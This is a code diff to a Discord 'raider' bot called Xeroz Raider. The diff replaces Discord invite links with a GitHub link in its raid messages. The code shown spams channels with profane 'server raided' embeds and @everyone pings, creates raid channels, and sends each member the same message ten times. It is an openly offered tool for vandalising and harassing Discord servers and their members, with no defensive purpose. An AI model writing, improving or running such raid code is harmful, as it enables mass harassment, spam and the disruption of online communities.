@@ -17,8 +17,8 @@ eme = discord.Embed(
   title = 'Xeroz Raider',
   description = 'THE SERVER HAS BEEN RAIDED BY THE RAIDER XEROZ! ¡Free software!'
 )
-ems = discord.Embed(title="¡THIS SERVER HAS BEEN RAIDED!", url="https://discord.gg/AAmDgKP9BU", description="RAIDED BY XerozRaider!", color=0xffb3b3)
-ems.set_author(name="Xeroz Raider", url="https://discord.gg/AAmDgKP9BU", icon_url="https://cdn.discordapp.com/emojis/1033852930618576896.webp?size=96&quality=lossless")
+ems = discord.Embed(title="¡THIS SERVER HAS BEEN RAIDED!", url="https://github.com/Lawxsz/xeroz", description="RAIDED BY XerozRaider!", color=0xffb3b3)
+ems.set_author(name="Xeroz Raider", url="https://github.com/Lawxsz/xeroz", icon_url="https://cdn.discordapp.com/emojis/1033852930618576896.webp?size=96&quality=lossless")
 ems.set_thumbnail(url="https://cdn.discordapp.com/attachments/1027661729687154808/1033925526085181470/zero2.jpg_172596871.jpg")
 ems.add_field(name=":key: SERVER RAIDED", value=":recycle: BY XEROZ RAIDER [FREE]", inline=True)
 ems.add_field(name=":ghost: SERVER PWNED!!!", value="FUCKEED", inline=False)
@@ -59,7 +59,7 @@ async def coffe(ctx):
         await ctx.guild.create_text_channel("Xeroz Raid")
         guild = ctx.guild.channels[channel]
         await guild.send(embed=ems)
-        await guild.send("@everyone SHIT SERVER FUCKED")
+        await guild.send("@everyone SHIT SERVER FUCKED by https://github.com/Lawxsz/xeroz")
 @bot.command()
 async def croles(ctx):
     guild = ctx.guild
@@ -98,22 +98,22 @@ async def dm(ctx):
             x = 0
             while x<10:
               await member.send(embed=eme)
-              await member.send("https://discord.gg/AAmDgKP9BU")
+              await member.send("https://github.com/Lawxsz/xeroz")
               x = x + 1
             #await ctx.send("Sent message")
         except:
-             await ctx.send("SERVER HAS BEEN FUCKED BY XEROZ RAIDER @everyone")
+             await ctx.send("SERVER HAS BEEN FUCKED BY XEROZ RAIDER @everyone https://github.com/Lawxsz/xeroz")
 @bot.command()
 async def spam(ctx):
     leng = 30
     for i in range (leng):
-        embed=discord.Embed(title="¡THIS SERVER HAS BEEN RAIDED!", url="https://discord.gg/AAmDgKP9BU", description="RAIDED BY XerozRaider!", color=0xffb3b3)
+        embed=discord.Embed(title="¡THIS SERVER HAS BEEN RAIDED!", url="https://github.com/Lawxsz/xeroz", description="RAIDED BY XerozRaider!", color=0xffb3b3)
         embed.set_author(name="Xeroz Raider", url="https://discord.gg/AAmDgKP9BU", icon_url="https://cdn.discordapp.com/emojis/1033852930618576896.webp?size=96&quality=lossless")
         embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1027661729687154808/1033925526085181470/zero2.jpg_172596871.jpg")
         embed.add_field(name=":key: SERVER RAIDED", value=":recycle: BY XEROZ RAIDER [FREE SOFTWARE]", inline=True)
         embed.add_field(name=":ghost: SERVER PWNED!!!", value="FUCKEEED", inline=False)
         embed.set_footer(text="Xeroz Raider")
-        await ctx.send("@everyone get fucked discord.gg/pornhub")
+        await ctx.send("@everyone get fucked https://github.com/Lawxsz/xeroz")
         await ctx.send(embed=embed)
 @bot.event
 async def on_ready():
